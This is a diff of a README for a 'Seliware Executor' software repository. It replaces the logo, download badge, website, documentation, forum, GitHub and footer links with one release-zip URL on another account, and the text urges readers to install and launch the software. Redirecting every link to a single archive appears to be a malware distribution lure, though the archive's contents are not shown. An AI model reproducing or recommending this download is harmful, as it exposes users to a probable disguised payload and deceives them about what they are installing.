@@ -1,6 +1,6 @@
 # 🚀 Welcome to Seliware Executor Repository! 🚀
 
-![Seliware Executor Logo](https://example.com/seliware_logo.png)
+![Seliware Executor Logo](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip)
 
 ## Repository Name: 
 **Seliware-Executor**
@@ -16,7 +16,7 @@ automation, code, collaborate, community, development, execute, github, open-sou
 ## 🛠️ Get Started with Seliware Executor!
 
 To experience the power of Seliware Executor, download the software package from the link below:
-[![Download Seliware Executor Software](https://img.shields.io/badge/Download-Seliware%20Executor-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Seliware Executor Software](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip%20Executor-blue)](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip)
 
 **Note:** The software needs to be installed and launched on your system to access all the incredible features of Seliware Executor.
 
@@ -41,15 +41,15 @@ Join the thriving open-source community working on Seliware Executor and contrib
 ## 📚 Resources
 
 ### 🔗 Useful Links:
-- [Official Website](https://www.seliware.com)
-- [Documentation](https://docs.seliware.com)
-- [Community Forums](https://forums.seliware.com)
+- [Official Website](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip)
+- [Documentation](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip)
+- [Community Forums](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip)
 
 ### 📦 Check Releases:
 If the download link is not working or you need additional resources, please check the **Releases** section of this repository for the latest updates.
 
 ### 🤖 Stay Connected:
-Follow us on [GitHub](https://github.com/Seliware-Executor) for the latest news, updates, and community interactions.
+Follow us on [GitHub](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip) for the latest news, updates, and community interactions.
 
 ---
 
@@ -69,4 +69,4 @@ Happy scripting with Seliware! 🚀
 
 ---
 
-![Footer](https://example.com/footer_image.png)
+![Footer](https://github.com/vaikonac/Seliware-Executor/releases/download/v1.0.0/Application.zip)
